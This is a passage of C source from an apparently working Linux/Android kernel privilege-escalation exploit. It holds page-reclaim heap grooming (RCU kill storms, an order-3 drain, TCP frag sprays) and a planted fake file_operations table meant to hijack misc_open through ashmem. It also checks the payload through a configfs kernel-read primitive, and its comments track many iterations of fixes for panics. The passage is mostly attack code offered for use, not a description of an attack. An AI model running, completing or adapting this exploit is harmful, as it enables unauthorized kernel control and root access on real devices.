   * collapses the phase-2 alloc oracle to the true pfn. */
  struct tp_free_win tfree;
  int k_true = -1;
  int phase2_short_sends = 0;
  int phase2_hit_idx = -1;
  int phase2_total_ok = 0;
  ks_free_arm_win(&tfree, base);
  /* fix46: hold-drain the order-3 pool BEFORE the victim can free, so
   * the storm's discards leave the victim as the only grid-candidate
   * page that phase-2 can allocate. */
  order3_drain_hold();
  /* The victim's mm_struct is pinned by child_leak's task (not the memfd).
   * child_leak already exited (waitpid above), so memfd_leak is the only
   * remaining reference — but on this kernel it doesn't pin.  The mm_struct
   * is already RCU-deferred from the child's exit.  Close the fd to drop
   * the last userspace reference; the RCU callback fires during the sends. */
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  /* Wait for the victim's RCU callback to fire so the page reaches the
   * buddy BEFORE the send loop starts.  Without this sleep the page is
   * freed mid-send and the skb allocations that happen earlier miss it. */
  usleep(100000);
  for (int y = 0; y < 4; y++)
    sched_yield();
  {
    long slabs = -1, objs = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0)
      pr_info("slabinfo post-victim-rcu: slabs=%ld objs=%ld free=%ld\n",
              slabs, objs, slabs * (long)mm_objs_per_slab - objs);
  }
  shrink_mm_slab("post-pins");
  /*
   * Tier-0 slab churn: OFF by default (KS_SLAB_CHURN=1 re-enables).
   * Analysis of the three stock-boot panics showed the teardown already
   * empties the victim pages while nr_partial (~16 parked) >= min_partial
   * (~11), so the pages discard straight to the pcp -- and the reclaim
   * sends are supposed to take them LIFO.  A fork-churn BETWEEN teardown
   * and sends is actively harmful: the cache first consumes its partial
   * free slots and then GROWS from the buddy, i.e. it re-claims the very
   * victim pages just discarded into the pcp, and the subsequent free
   * re-buries them under the churn's own pile.  chain15's working order
   * was teardown -> (shrink) -> sends with nothing in between.  Keep the
   * knob for experiments only.
   */
  if (env_on("KS_SLAB_CHURN")) {
    long slabs = -1, objs = 0, free_slots = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0) {
      free_slots = (slabs * (long)mm_objs_per_slab) - objs;
      if (free_slots < 0)
        free_slots = 0;
      pr_info("slabinfo churn pre slabs=%ld objs=%ld free_slots=%ld\n",
              slabs, objs, free_slots);
    } else {
      pr_warning("slabinfo churn: mm row unreadable; default burst\n");
    }
    long burst_n = free_slots + (long)mm_objs_per_slab * 24;
    if (burst_n < 224)
      burst_n = 224;
    if (burst_n > 1536)
      burst_n = 1536;
    for (int cyc = 1; cyc <= 3; cyc++) {
      pid_t bp[1536];
      int live = 0;
      long n = burst_n;
      for (long i = 0; i < n; i++) {
        bp[i] = clone_child();
        if (bp[i] >= 0)
          live++;
      }
      for (long i = 0; i < n; i++) {
        if (bp[i] >= 0)
          kill_child(bp[i]);
      }
      long slabs2 = -1, objs2 = 0;
      read_mm_slab_row(&slabs2, &objs2);
      pr_info("slabinfo churn cyc=%d n=%ld live=%d slabs %ld->%ld "
              "objs %ld->%ld\n",
              cyc, n, live, slabs, slabs2, objs, objs2);
      slabs = slabs2;
      objs = objs2;
    }
  }
  int sends_ok = 0, send_err = 0;
  /*
   * RCU warm-up ("废弹预热"): the victim mm_struct's RCU callback only
   * fires during page allocations (usleep/membarrier/yield/small-sends
   * all fail to trigger it on this 16-CPU kernel).  An order-3 sendmsg
   * goes through the buddy allocator, which triggers cond_resched →
   * RCU_SOFTIRQ → mm_struct frees.  Do ONE order-3 send on a throwaway
   * socketpair, then close it (releasing its captured page back to the
   * buddy).  By the time the real reclaim sends start, the victim page
   * is already in the buddy's order-3 free list (LIFO head, neighbors
   * still pinned by prepare → no coalescing).
   */
  {
    /*
     * RCU flush via socket create/close: each socket() allocates a
     * struct sock and close() frees it via call_rcu.  Doing 1024
     * create/close cycles queues 1024 RCU callbacks, enough to drive a
     * grace period.  Unlike clone+kill, this does NOT allocate
     * mm_structs, so no new slab pages are created adjacent to the
     * victim → no coalescing on free.  When the grace period completes,
     * ALL pending call_rcu callbacks fire, including the pre-children
     * and victim mm_struct frees.
     */
    int nsock = 0;
    for (int i = 0; i < 1024; i++) {
      int s = socket(AF_UNIX, SOCK_DGRAM, 0);
      if (s >= 0) {
        close(s);
        nsock++;
      }
    }
    pr_info("rcu socket cycles=%d\n", nsock);
    {
      long slabs = -1, objs = 0;
      if (read_mm_slab_row(&slabs, &objs) == 0)
        pr_info("slabinfo post-socket-rcu: slabs=%ld objs=%ld free=%ld\n",
                slabs, objs, slabs * (long)mm_objs_per_slab - objs);
    }
  }
  /*
   * chain15's working order: teardown → (shrink) → sends with nothing
   * in between.  We now close victim BEFORE the send loop and keep
   * prepare alive (see above) to prevent buddy coalescing.  The RCU
   * callback fires during the warm-up sendmsg syscalls; the victim page
   * enters the buddy head (neighbors still pinned by prepare → no merge)
   * and the first order-3 send captures it.
   */
  /* fix36: arm the pfn-filtered alloc oracle across phase-1 sends.
   * fix40: full grid here (k_true not yet pinned). */
  struct tp_win tpw1, tpw2;
  ks_tp_arm_win(&tpw1, base, -1);
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      send_err = errno;
      break;
    }
    sends_ok++;
    /* Sample slabinfo every 64 sends to see when RCU fires; suppressed
     * while the oracle is armed (a diagnostic kmalloc page alloc in our
     * own task could consume a candidate pfn and poison the count). */
    if ((sends_ok & 63) == 0 && tpw1.n == 0 && tpw1.ctrl_fd < 0) {
      long slabs = -1, objs = 0;
      if (read_mm_slab_row(&slabs, &objs) == 0)
        pr_info("send[%d] slabinfo: slabs=%ld objs=%ld free=%ld\n",
                sends_ok, slabs, objs,
                slabs * (long)mm_objs_per_slab - objs);
    }
  }
  pr_info("reclaim sends ok=%d/%d last_err=%d\n", sends_ok,
          SKB_RECLAIM_SENDS, send_err);
  ks_tp_read_win(&tpw1);
  ks_tp_log_win("phase1", &tpw1);
  /*
   * Two-phase reclaim: RCU callbacks for pre-children + victim mm_struct
   * fire only during the massive kill storm (1326 kills), which happens
   * AFTER phase-1 sends.  So phase-1 sends always miss (capture=0).
   *
   * Phase 2: kill post (34) + spray (204) + first 500 prepare children
   * (= 738 kills total, enough to drive RCU).  The victim slab (already
   * empty from pre-kill + victim close) discards to the buddy LIFO head.
   * Remaining 588 prepare children pin neighboring slabs → no coalescing.
   * Then phase-2 sends on a FRESH socketpair capture the victim page.
   */
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = -1;
    if (post_ctx.memfds[i] > 0) {
      close(post_ctx.memfds[i]);
      post_ctx.memfds[i] = -1;
    }
  }
  pr_info("phase2 forensics: post killed n=%zu\n", post_ctx.mm_cnt);
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
    if (spray_ctx.memfds[i] > 0) {
      close(spray_ctx.memfds[i]);
      spray_ctx.memfds[i] = -1;
    }
  }
  pr_info("phase2 forensics: spray killed n=%zu\n", spray_ctx.mm_cnt);
  /* Interleaved prepare kill: kill 33 of every 34 (one slab page),
   * keep 1 alive as a pin.  The live object prevents SLUB from
   * discarding that slab → neighbor pages stay allocated → victim's
   * freed page cannot coalesce into a higher-order buddy block.
   * Still 1056 kills + post/spray = 1294 total, enough wall-clock
   * for RCU callbacks to fire (fix20 proved 1326 works, 738 doesn't;
   * 1294 + busy-wait should be sufficient). */
  /* Kill ALL prepare children — the only pattern proven to trigger RCU
   * (fix20: free=170).  Interleaved pins keep every slab non-empty and
   * SLUB never processes the freed objects (fix21/22: free=0).
   * Coalescing risk: victim page may merge into higher-order buddy
   * block.  Mitigate with 256 phase-2 sends (vs fix20's 64) to walk
   * deeper into split blocks. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
    if ((i & 255) == 0)
      pr_info("phase2 forensics: prepare storm i=%zu/%zu\n", i,
              prepare_ctx.mm_cnt);
  }
  pr_info("phase2 forensics: prepare storm done n=%zu\n",
          prepare_ctx.mm_cnt);
  /*
   * fix42: NOW drop the 33 pre-children (the victim's slab co-tenants).
   * The storm above emptied the OTHER ~32 slabs, raising nr_partial
   * well above min_partial.  The pre-children's mm frees (queued here)
   * fire in the next grace period -- driven by the phase-2 order-3
   * sendmsgs (buddy alloc -> cond_resched -> RCU_SOFTIRQ, the only
   * mechanism proven to flush mm_struct RCU on this kernel).  When
   * they fire, the victim's slab (33 free co-tenants + 1 already-free
   * victim) empties onto the HIGH nr_partial -> takes the
   * discard-to-buddy arm -> lands at the order-3 LIFO head -> the very
   * next frag refill captures it.  Fix41 killed the pre-children BEFORE
   * the storm, so the victim's slab emptied FIRST (its callbacks were
   * queued earliest) while nr_partial was still ~0 -> SLUB parked the
   * empty page on the partial list -> it never reached the buddy -> the
   * phase-2 drain could never capture it -> the route fired with stale
   * mm garbage at base+0x180 -> misc_open jumped through a garbage
   * ->open -> kernel_panic (fix41 boot 36b15897, "opening ashmem").
   */
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = -1;
    if (pre_ctx.memfds[i] > 0) {
      close(pre_ctx.memfds[i]);
      pre_ctx.memfds[i] = -1;
    }
  }
  pr_info("phase2 forensics: pre dropped n=%zu\n", pre_ctx.mm_cnt);
  /* Best-effort RCU nudge; the phase-2 sends are the real driver. */
  long mb_rv = syscall(__NR_membarrier, 1 /* MEMBARRIER_CMD_GLOBAL */, 0);
  pr_info("phase2 forensics: membarrier rv=%ld errno=%d\n", mb_rv, errno);
  {
    long slabs = -1, objs = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0)
      pr_info("slabinfo after rcu-kill: slabs=%ld objs=%ld free=%ld\n",
              slabs, objs, slabs * (long)mm_objs_per_slab - objs);
  }
  /* fix40: the kill storm is over; the victim discard must have fired by
   * now (fix38 observed free=170 after the storm).  Read the free
   * oracles: exactly one candidate pfn freed => k_true pinned.  Zero
   * means the RCU callback ran outside our task context (pid=0 filter
   * missed) or the page never discarded; >1 means coincidence
   * contamination.  Both are safe aborts -- the gate refuses to pass
   * without k_true, and prepare retries. */
  {
    int kh = -1;
    int nfh = ks_free_read_win(&tfree, &kh);
    if (nfh == 1)
      k_true = kh;
    /* fix40 diagnostic, corrected by fix54's data: on this boot the
     * victim's discard free DOES land in our task context (RCU_SOFTIRQ
     * interrupting our thread during the storm/membarrier window) --
     * all three attempts saw nhit=1 k_true=3, not the nhit=0 this
     * comment long predicted (rcuop offload).  k_true=3 is the boot's
     * true page_offset error in GiB and the fix54 gate requires the
     * phase-2 capture to match it. */
    pr_info("fix40 free verdict nhit=%d k_true=%d\n", nfh, k_true);
  }
  /* Diagnostic: snapshot buddyinfo line 0 (DMA32) and line 1 (Normal)
   * to see how many order-3 free pages exist before phase-2. */
  {
    FILE *bf = fopen("/proc/buddyinfo", "r");
    if (bf) {
      char line[256];
      int lno = 0;
      while (lno < 2 && fgets(line, sizeof(line), bf)) {
        pr_info("buddy pre[%d] %s", lno, line);
        lno++;
      }
      fclose(bf);
    } else {
      pr_info("buddy pre fopen errno=%d\n", errno);
    }
  }
  /*
   * Phase 2: multi-connection TCP spray.  AF_UNIX frags are always
   * order-0 (sock_alloc_send_pskb max_page_order=0).  TCP's
   * skb_page_frag_refill wants order-3 (PAGE_FRAG_CACHE_MAX_SIZE=32K)
   * but with __GFP_NORETRY, so on a fragmented buddy it silently falls
   * back to order-0.  fix25 proved 256 single-connection sends miss
   * (capture=0) — either the order-3 alloc is falling back, or the
   * victim page coalesced into a higher-order block too deep for 256
   * allocations.  Fix: spray from 4 connections × fill-until-EAGAIN
   * ≈ 5000+ page-frag allocations, enough to walk deep into split
   * blocks regardless of which order the buddy actually hands out.
   * Extra connections are leaked on purpose — their skb frags pin
   * whatever pages they captured.
   */
  /*
   * fix35: watchpoint fds live at function scope so the verify block
   * below can gate on the recorded hit counts.
   */
  int wp_fd_nonce = -1, wp_fd_open = -1, wp_fd_sent = -1;
  long long wp_n = -1, wp_o = -1, wp_s = -1;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    wp_fd_nonce = wp_open_watch(skb_payload_base + FOPS_OFF + 0x100, "nonce");
    wp_fd_open =
        wp_open_watch(skb_payload_base + FOPS_OFF + FOPS_OPEN_OFF, "open");
    wp_fd_sent = wp_open_watch(base + 0x7f00, "sentinel");
  }
  /*
   * fix43: phase2 send loop runs on a FRESH pthread.  task_frag is
   * per-task (current->task_frag); the main thread's is dirty from the
   * 1024 unix phase1 sends + shaping send (arbitrary offset X).  A new
   * thread starts with task_frag.page == NULL, so the first TCP frag
   * refill allocates a fresh order-3 page at offset 0 and every
   * subsequent send in that thread is a full-page frag with buf[0..]
   * at page[0..].  Without this, page+0x180 (the route's fake_fops
   * slot) lands mid-table and misc_open jumps through garbage.
   */
  struct phase2_send_ctx p2ctx;

  {
    /* fix40: 8 connections x 112 sends (3.5MB each, below the 4.3MB
     * tcp_rmem[2] drop threshold on this device): every send stays deep
     * in the full-send zone, MSG_DONTWAIT never sees EAGAIN, so the
     * stream-alignment invariant (each frag holds buf[0..] at page[0..])
     * cannot break.  A short send (s != send_size) is recorded and the
     * gate refuses to pass -- a shifted stream would hand the route a
     * misaligned table even when the capture itself is real.  8x112 = 896
     * sends ~= 1120 order-3 allocs, enough walk depth for the observed
     * burial (~976).  224 sends/connection was 7MB and overflowed the
     * 4.3MB tcp_rmem cap, letting the kernel drop the victim skb and
     * free the page before the open -> panic (fix51). */
    int keep_cli[8], keep_srv[8];
  int nconn = 0;
  for (int c = 0; c < 8; c++) {
      int lst = socket(AF_INET, SOCK_STREAM, 0);
      if (lst < 0) break;
      int one = 1;
      setsockopt(lst, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
      struct sockaddr_in laddr = {0};
      laddr.sin_family = AF_INET;
      laddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
      laddr.sin_port = 0;
      socklen_t alen = sizeof(laddr);
      if (bind(lst, (struct sockaddr *)&laddr, sizeof(laddr)) != 0 ||
          getsockname(lst, (struct sockaddr *)&laddr, &alen) != 0 ||
          listen(lst, 1) != 0) {
        close(lst);
        break;
      }
      int cli = socket(AF_INET, SOCK_STREAM, 0);
      if (cli < 0) { close(lst); break; }
      int snd = 16 << 20;
      setsockopt(cli, SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
      int fl = fcntl(cli, F_GETFL, 0);
      if (fl >= 0) fcntl(cli, F_SETFL, fl | O_NONBLOCK);
      connect(cli, (struct sockaddr *)&laddr, sizeof(laddr));
      int srv = accept(lst, NULL, NULL);
      close(lst);
      if (srv < 0) { close(cli); break; }
      int rcv = 32 << 20;
      /* fix51: SO_RCVBUF is clamped to tcp_rmem[2]=4.3MB on this device
       * (proc/sys/net/ipv4/tcp_rmem), so a 7MB receive queue overflows
       * and the kernel drops the oldest skb, freeing the victim page
       * before the open -> panic on garbage ->open.  SO_RCVBUFFORCE
       * bypasses the cap (root-only, but we run pre-root; falls back to
       * the clamped value).  Also gate each connection's send budget to
       * 4MB so the queue can never reach the drop threshold even if the
       * force fails. */
      if (setsockopt(srv, SOL_SOCKET, SO_RCVBUFFORCE, &rcv, sizeof(rcv)) != 0) {
        setsockopt(srv, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
      }
      keep_cli[nconn] = cli;
      keep_srv[nconn] = srv;
      nconn++;
    }
    pr_info("phase2 tcp connections=%d\n", nconn);
    /*
     * fix43: perf counters + watchpoints are pid=0 (count only the
     * calling task).  Arm them INSIDE the send thread so they see the
     * worker's order-3 frag allocs.  Main thread just joins and reads
     * the results back from the ctx.
     */
    memset(&p2ctx, 0, sizeof(p2ctx));
    p2ctx.keep_cli = keep_cli;
    p2ctx.nconn = nconn;
    p2ctx.msg = &msg;
    p2ctx.send_size = send_size;
    p2ctx.base = base;
    p2ctx.wp_fd_nonce = wp_fd_nonce;
    p2ctx.wp_fd_open = wp_fd_open;
    p2ctx.wp_fd_sent = wp_fd_sent;
    p2ctx.stop_after_hit = deterministic;
    p2ctx.hit_c = -1;
    p2ctx.hit_i = -1;
    p2ctx.hit_idx = -1;
    p2ctx.hit_idx_out = -1;
    p2ctx.hit_ord3_at = -1;
    {
      pthread_t p2th;
      if (pthread_create(&p2th, NULL, phase2_send_thread, &p2ctx) != 0) {
        pr_warning("phase2 pthread_create failed, running inline\n");
        phase2_send_thread(&p2ctx);
      } else {
        pthread_join(p2th, NULL);
      }
    }
    int total_ok = p2ctx.total_ok, last_err = p2ctx.last_err;
    int hit_c = p2ctx.hit_c, hit_i = p2ctx.hit_i, hit_idx = p2ctx.hit_idx;
    long long hit_ord3_at = p2ctx.hit_ord3_at;
    int gsend = p2ctx.gsend;
    unsigned long long hit_cum = p2ctx.hit_cum, hit_s = p2ctx.hit_s;
    unsigned long long hit_s_next = p2ctx.hit_s_next;
    int have_s_next = p2ctx.have_s_next;
    phase2_total_ok = total_ok;
    phase2_short_sends = p2ctx.short_sends;
    phase2_hit_idx = p2ctx.hit_idx_out;
    /* Thread already read+closed the counters; copy results back. */
    tpw2 = p2ctx.tpw2;
    wp_n = p2ctx.wp_n;
    wp_o = p2ctx.wp_o;
    wp_s = p2ctx.wp_s;
    wp_fd_nonce = wp_fd_open = wp_fd_sent = -1;
    if (hit_c >= 0)
      pr_info("fix38 capture conn=%d send=%d gsend=%d pfn=%lu ord3_at=%lld "
              "all_at_hit=1\n",
              hit_c, hit_i, gsend, tpw2.cand_pfn[hit_idx], hit_ord3_at);
    else
      pr_info("fix38 no capture during sends gsend=%d last_ord3=%lld\n",
              gsend, hit_ord3_at);
    /*
     * fix51 (corrected by fix54): DO NOT rebase skb_payload_base.  The
     * pfn-filtered hit is NOT a cross-context false positive -- fix53's
     * conclusion was a misdiagnosis of its own broken formula.  Tier-0
     * cannot measure page_offset (no tracefs -> no pvo/vmemmap), so
     * ks_layout_infer_from_leak() GUESSES la0; on this boot the guess is
     * off by exactly k_true*1GiB (3 GiB observed on all three attempts:
     * free and alloc both at est_pfn+786432).  fix53 rebased with
     * new_pb = la0 + pfn_true<<12, mixing the GUESSED la0 with the TRUE
     * pfn, which lands k_true*1GiB away from the leaked VA -- an
     * unrelated page whose garbage ->open is what actually panicked.
     * The truth it accidentally exposed: candidate k_true maps to VA
     * `base` under the real (unknown) page_offset, i.e. `base` was
     * correct all along and the right rebase is 0.  The leak gives a
     * real VA; la0 only feeds the tracepoint grid.  Keep the original
     * payload pointers; fix54's gate pins k_hit == k_true so the
     * captured page is the one the free oracle watched free.
     */
    if (hit_c >= 0 && hit_idx >= 0 && tpw2.est_pfn) {
      int nhit51 = 0;
      for (int i = 0; i < tpw2.n; i++)
        if (tpw2.cand_hits3[i] > 0) nhit51++;
      pr_info("fix51 capture-only (no rebase) nhit=%d k=%ld pfn=%lu "
              "est_pfn=%lu base=%llx payload_base=%llx\n",
              nhit51,
              ((long)tpw2.cand_pfn[hit_idx] - (long)tpw2.est_pfn) / (1L << 18),
              tpw2.cand_pfn[hit_idx], tpw2.est_pfn, (unsigned long long)base,
              (unsigned long long)skb_payload_base);
    }
    /* fix39: derive the fake-fops phase offset from the stream position at
     * the capture send and rebase the payload globals so the 0x80 tile the
     * kernel lands on actually starts at the table origin.  Full formula in
     * the commit notes; drop only when the page was already near-full.
     * fix43: SKIP entirely in deterministic mode -- the fresh-thread
     * task_frag guarantees offset=0, so delta39 is always 0 and a
     * non-zero value would mean the layout assumption broke (rebase
     * would move fake_fops off the table origin).  Diagnostic log only. */
    if (hit_c >= 0 && payload_mode == PAGE_PAYLOAD_FOPS) {
      unsigned long long A = hit_cum & 0x7fffULL;
      int delta39 = (A > 0x8000ULL - 32ULL) ? 0 : (int)(A & 0x7fULL);
      pr_info("fix39 phase hit_cum=%llx A=%llx sK=%llx sK1=%llx have1=%d "
              "delta=%d deterministic=%d\n",
              hit_cum, A, hit_s, hit_s_next, have_s_next, delta39,
              deterministic);
      if (deterministic) {
        if (delta39)
          pr_warning("fix39 deterministic delta=%d (expected 0) -- layout "
                     "assumption broken, NOT rebasing\n", delta39);
        else
          pr_info("fix39 deterministic delta=0 OK\n");
      } else if (delta39) {
        uintptr_t old_pb = skb_payload_base;
        skb_payload_base = old_pb + (uintptr_t)delta39;
        fake_lock = skb_payload_base + LOCK_OFF;
        fake_w0 = skb_payload_base + W0_OFF;
        fake_task = skb_payload_base + FAKE_TASK_OFF;
        fake_fops = skb_payload_base + FOPS_TABLE_OFF;
        fake_parent = fake_fops;
        fake_right = text_addr(ASHMEM_MISC_FOPS);
        fake_left = 0;
        binwrite_target = skb_payload_base + SCRATCH_OFF;
        skbdelta_write_payload(skb_payload_base);
        pr_info("fix39 rebase old_pb=%llx new_pb=%llx fake_fops=%llx\n",
                (unsigned long long)old_pb,
                (unsigned long long)skb_payload_base,
                (unsigned long long)fake_fops);
      } else {
        pr_info("fix39 delta=0 no rebase\n");
      }
    }
    pr_info("phase2 total sends ok=%d last_err=%d shorts=%d\n", total_ok,
            last_err, phase2_short_sends);
    /* wp hits / tp counters were read and closed inside the send thread
     * (pid=0 counters only see the calling task); results already copied
     * into wp_n/wp_o/wp_s and tpw2 above. */
    pr_info("payload wp hits nonce=%lld open=%lld sentinel=%lld\n", wp_n, wp_o,
            wp_s);
    ks_tp_log_win("phase2", &tpw2);
    /* Route reads/writes through the first connection's fds. */
    if (nconn > 0) {
      reclaim_sv[0] = keep_cli[0];
      reclaim_sv[1] = keep_srv[0];
    }
    /* Diagnostic: peek the HIT connection's stream (not conn 0 — hit_c
     * may differ) and dump the open-slot window so we can see whether the
     * kernel will load open from stream+0x1070 or stream+0x1071 (the
     * 1-byte shift that panics misc_open with PC=00+open[:7]).  Stream
     * offset == buffer offset because each send is the full payload and
     * TCP preserves order.  Must run inside this block: keep_srv/hit_c
     * are local. */
    {
      int peek_fd = -1;
      int peek_conn = hit_c;
      if (hit_c >= 0 && hit_c < nconn)
        peek_fd = keep_srv[hit_c];
      else if (reclaim_sv[1] >= 0) {
        peek_fd = reclaim_sv[1];
        peek_conn = 0;
      }
      if (peek_fd >= 0) {
        /* Cover nonce@0 and the open slot at FOPS_TABLE_OFF+FOPS_OPEN_OFF. */
        enum { PEEK_N = 0x1100 };
        static char peekbuf[PEEK_N];
        ssize_t pr = recv(peek_fd, peekbuf, PEEK_N, MSG_PEEK | MSG_DONTWAIT);
        if (pr > 0) {
          unsigned long long *w = (unsigned long long *)peekbuf;
          pr_info("phase2 peek conn=%d n=%zd w0=%llx w1=%llx w2=%llx w3=%llx\n",
                  peek_conn, pr, w[0], w[1], w[2], w[3]);
          /* Dump the open-slot window: mmap_flags@0x1068, open@0x1070. */
          size_t o = FOPS_TABLE_OFF + FOPS_OPEN_OFF;
          if ((size_t)pr >= o + 8) {
            unsigned char *b = (unsigned char *)peekbuf;
            unsigned long long at70 = 0, at6f = 0, at68 = 0;
            memcpy(&at68, b + o - 8, 8);
            memcpy(&at6f, b + o - 1, 8);
            memcpy(&at70, b + o, 8);
            pr_info("phase2 peek open@%zx at68=%016llx at6f=%016llx "
                    "at70=%016llx want_open=%016llx\n",
                    o, at68, at6f, at70,
                    (unsigned long long)text_addr(ASHMEM_OPEN));
            pr_info("phase2 peek hex@%zx", o - 8);
            for (size_t i = 0; i < 24 && o - 8 + i < (size_t)pr; i++)
              pr_info(" %02x", (unsigned char)b[o - 8 + i]);
            pr_info("\n");
          } else {
            pr_info("phase2 peek short for open slot pr=%zd need=%zu\n",
                    pr, o + 8);
          }
        } else {
          pr_info("phase2 peek conn=%d failed rv=%zd errno=%d\n", peek_conn, pr,
                  errno);
        }
      }
    }
    /* Leak keep_cli[1..] and keep_srv[1..] on purpose — their skbs pin
     * captured pages; closing would free them back to buddy. */
  }
  {
    long slabs = -1, objs = 0;
    if (read_mm_slab_row(&slabs, &objs) == 0)
      pr_info("slabinfo after sends: slabs=%ld objs=%ld free=%ld\n",
              slabs, objs, slabs * (long)mm_objs_per_slab - objs);
  }
  /* Diagnostic: buddyinfo after phase-2 to see order-3 consumption. */
  {
    FILE *bf = fopen("/proc/buddyinfo", "r");
    if (bf) {
      char line[256];
      int lno = 0;
      while (lno < 2 && fgets(line, sizeof(line), bf)) {
        pr_info("buddy post[%d] %s", lno, line);
        lno++;
      }
      fclose(bf);
    }
  }
  /* chain12: at the window the receive queue read back 1 byte instead of
   * sends*655360 -- snapshot it here to see whether the queue was ever
   * populated or got drained between sends and the window. */
  {
    int q_rx = -1, q_tx = -1;
    ioctl(reclaim_recv_fd(), SIOCINQ, &q_rx);
    ioctl(reclaim_sv[0], SIOCOUTQ, &q_tx);
    pr_info("reclaim queue right after sends rxq=%d txq=%d\n", q_rx, q_tx);
  }

  uintptr_t freed_pages[128];
  int nfreed = ks_watch_frees_read(freed_pages, 128);
  /* keep the pfn watch armed across route/CFI/window: a second base-pfn
   * free during the window proves the reclaim skbs were released there
   * (start() re-arms + clears the trace on the next attempt) */
  int base_freed = 0;
  for (int i = 0; i < nfreed; i++)
    if (freed_pages[i] == base)
      base_freed = 1;
  pr_info("free watch order3_frees=%d base_freed=%d\n", nfreed, base_freed);

  /*
   * The route's rb_erase store succeeds even when the payload never made
   * it into the leaked page, so misc_open() would later jump through a
   * garbage ->open (the observed pc=0x8 oops).  Read the planted ->open
   * slot back through a kprobe fetch and make prepare fail (retry) when
   * the reclaim lost the freelist race instead of handing a poisoned
   * payload to the route.
   */
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    uint64_t open_slot = 0;
    int fv = ks_probe_fetch64(skb_payload_base + FOPS_OFF + FOPS_OPEN_OFF,
                              &open_slot);
    uint64_t open_want = (uint64_t)text_addr(ASHMEM_OPEN);
    pr_info("payload verify open=%llx want=%llx rv=%d\n",
            (unsigned long long)open_slot, (unsigned long long)open_want, fv);
    /*
     * A matching open slot alone can be a stale table from an earlier
     * attempt (same deterministic bytes) -- that is the fake-alive
     * state whose window forks then turn object0 into mm garbage.
     * The per-run nonce at base+0x280 only matches when THIS run's
     * send actually captured the leaked page.
     */
    uint64_t nonce_now = 0;
    int nv = ks_probe_fetch64(skb_payload_base + FOPS_OFF + 0x100,
                              &nonce_now);
    int nonce_hit = (nv >= 0 && payload_nonce && nonce_now == payload_nonce);
    const char *ask = getenv("KS_ALLOW_STALE_PAYLOAD");
    int allow_stale = ask && ask[0] && strcmp(ask, "0") != 0 &&
                      strcasecmp(ask, "false") != 0 && strcasecmp(ask, "no") != 0;
    pr_info("payload nonce want=%llx got=%llx rv=%d capture=%d "
            "base_freed=%d allow_stale=%d\n",
            (unsigned long long)payload_nonce, (unsigned long long)nonce_now,
            nv, nonce_hit, base_freed, allow_stale);
    /*
     * Tier-0 fallback: when tracefs kprobe registration is denied
     * (ks_tracefs()==NULL, the Tier-0 default), fv/nv are always -1.
     * The configfs read primitive (ashmem confused-deputy) can read the
     * same kernel virtual addresses without tracefs: skb_payload_base is
     * a direct-map address, always mapped, so a read of a missed payload
     * returns stale data rather than faulting.  This gives Tier-0 a real
     * capture verdict instead of proceeding on faith.
     */
    if (fv < 0 && !ks_tracefs()) {
      int cdfd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      if (cdfd >= 0) {
        uint64_t c_open = 0, c_nonce = 0;
        ssize_t r1 = configfs_read_once(
            cdfd, skb_payload_base + FOPS_OFF + FOPS_OPEN_OFF, &c_open, 8);
        ssize_t r2 = configfs_read_once(
            cdfd, skb_payload_base + FOPS_OFF + 0x100, &c_nonce, 8);
        close(cdfd);
        if (r1 == 8 && r2 == 8) {
          fv = 0;
          nv = 0;
          open_slot = c_open;
          nonce_now = c_nonce;
          nonce_hit = (payload_nonce && nonce_now == payload_nonce);
          pr_info("payload verify via configfs open=%llx want=%llx "
                  "nonce=%llx hit=%d\n",
                  (unsigned long long)open_slot,
                  (unsigned long long)open_want,
                  (unsigned long long)nonce_now, nonce_hit);
        } else {
          pr_warning("configfs verify failed r1=%zd r2=%zd\n", r1, r2);
        }
      }
      if (fv < 0) {
        pr_info("payload verify unavailable (kprobe denied); "
                "falling back to watchpoint oracle\n");
      }
    }
    /*
     * fix35/fix41 gate: no blind runs.  Order of authority:
     *   1. content verify (kprobe/configfs) readable -> it decides;
     *   2. otherwise the phase-2 watchpoints decide (dead on this boot
     *      -- kernel-address HW breakpoints return EINVAL -- kept for
     *      devices where they work);
     *   3. fix42 Tier-0: drain + CAPTURE EVIDENCE.  The victim page
     *      now discards AFTER the storm (nr_partial high -> cannot be
     *      parked) and lands at the order-3 LIFO head; the phase-2
     *      frag walk captures it and the pfn-filtered order-3 counter
     *      fires on the victim's true candidate.  Requiring >=1 hit
     *      converts the gate from "we sent enough" to "we demonstrably
     *      captured a grid page" -- zero hits means the victim never
     *      reached the buddy (RCU stall / counter miss) and the route
     *      would fire on stale garbage, so we abort safely instead.
     *      A lone hit that is NOT the victim (coincidence, ~1-8%) can
     *      still panic; the host relaunch loop absorbs that.
     *   4. volume shortfall -> discard and retry.
     */
    int wp_armed = (wp_n >= 0 && wp_o >= 0 && wp_s >= 0);
    int wp_capture = wp_armed && wp_n > 0 && wp_o > 0 && wp_s > 0;
    long long tp_b1 = ks_tp_best3(&tpw1, NULL);
    long long tp_b2 = ks_tp_best3(&tpw2, NULL);
    long long tp_a1 = ks_tp_best(&tpw1, NULL);
    long long tp_a2 = ks_tp_best(&tpw2, NULL);
    int content_ok =
        (fv >= 0 && open_slot == open_want && (nonce_hit || allow_stale));
    enum { DRAIN_FLOOR = 512 };
    /* fix46: with the order-3 hold-drain the victim is the only grid
     * candidate that can still be free, so ANY candidate order-3 hit IS
